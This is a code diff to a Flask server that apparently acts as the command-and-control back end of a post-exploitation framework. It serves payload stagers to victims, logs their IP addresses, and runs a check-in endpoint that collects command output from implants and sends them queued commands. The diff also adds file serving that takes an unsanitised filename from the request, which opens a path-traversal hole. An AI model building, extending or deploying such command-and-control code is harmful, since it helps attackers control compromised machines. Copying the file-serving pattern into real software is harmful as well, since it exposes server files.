@@ -3,7 +3,7 @@ import os
 import urllib.parse as parse
 
 from connect import color, connection, util
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, send_file
 
 app = Flask(__name__)
 
@@ -18,11 +18,10 @@ def serve_stagers(format_id):
     connection_id = util.generate_id()
     connection = engine.create_connection(connection_id, engine.STAGERS[format_id])
     connection.system_information['ip'] = remote_addr
-    connection_id_variable = (util.generate_str(), connection_id)
     return render_template(
         f'stagers/{engine.connections[connection_id].stager.format}',
         checkin_uri=checkin_uri,
-        connection_id=connection_id_variable,
+        connection_id=connection_id,
         variables=engine.STAGERS[format_id].variables,
     )
 
@@ -36,22 +35,23 @@ def checkin():
     except:
         return template
     internet_addr = connection.system_information['ip']
+    connection.check_in()
     if 'results' in post_data.keys():
         color.normal('\n')
         color.information(f'results recieved ({internet_addr})')
         color.normal(parse.unquote(post_data['results']))
-    if connection.command_queue:
+    if 'filename' in post_data.keys():
+        filename = post_data['filename']
+        return send_file(f'templates/uploads/{filename}', mimetype='image/jpg')
+    if 'command_request' in post_data.keys() and connection.command_queue:
         template = render_template('connection_template.html', random_data=util.random_data, command=connection.command_queue.pop(0))
-    if connection.status != 'connected':
-        connection.status = 'connected'
-        color.success(f'Successful connection ({internet_addr})')
-    connection.check_in()
     return template
 
 def run(ip, port):
     os.environ['WERKZEUG_RUN_MAIN'] = 'true'
     log = logging.getLogger('werkzeug')
     log.disabled = True
+    app.config['TEMPLATES_AUTO_RELOAD'] = True
     try:
         app.run(host=ip, port=port)
     except:
